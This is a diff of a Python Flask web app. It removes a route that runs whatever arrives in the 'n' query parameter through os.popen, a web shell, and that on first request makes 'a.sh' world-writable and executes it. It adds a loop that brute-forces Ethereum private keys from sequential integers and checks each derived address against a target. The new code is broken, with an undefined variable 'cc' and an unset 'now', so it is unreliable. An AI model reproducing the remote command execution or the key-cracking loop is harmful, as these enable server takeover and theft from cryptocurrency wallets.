@@ -14,6 +14,26 @@ import multiprocessing
 import threading
 import time
 import subprocess
+from coincurve import PublicKey
+from sha3 import keccak_256
+import time
+
+def f1(x,y):
+    cnt=x
+    i=0
+    start_time = time.time()
+    while i<y:
+        private_key =cnt.to_bytes(32, byteorder='big')
+        public_key = PublicKey.from_valid_secret(private_key).format(compressed=False)[1:]
+        addr = keccak_256(public_key).digest()[-20:]
+        addr=addr.hex()
+        private_key=private_key.hex()
+        cnt=cnt+1
+        i=i+1
+        if addr==str("hgjhgjhghjg"):
+            s=private_key+" : "+addr
+    return ("--- %s seconds ---" % (time.time() - start_time)) + str(addr)
+
 
 
 
@@ -26,26 +46,14 @@ port = int(os.getenv("PORT", 9099))
 
 @app.route('/')
 def hello_world():
-    aa=request.args.get("n")
-    #c=int(aa)
-    
-    ff="false"
-    try:
-        f1 = open('myfile.txt')
-        f1.close()
-        ff="true"
-    except FileNotFoundError:
-        ff="false"
-    if ff=="false":
-        f1=open("myfile.txt","a")
-        f1.close()
-        f = os.popen("chmod 777 a.sh")
-        f = subprocess.Popen(["bash", "a.sh", "runserver"])
+    nn=request.args.get("n")
+    cnt=request.args.get("cnt")
+    nn=int(nn)
+    cnt=int(cc)
+    ff=f1(nn,cnt)
     
 
-
-    f = os.popen(str(aa))
-    now = f.read()  
+    
     
        
     return "<xmp>" + 'instance  ' + str(os.getenv("CF_INSTANCE_INDEX", 0))+ "   lsss   " +now+"   first    "+ff+  "</xmp>"
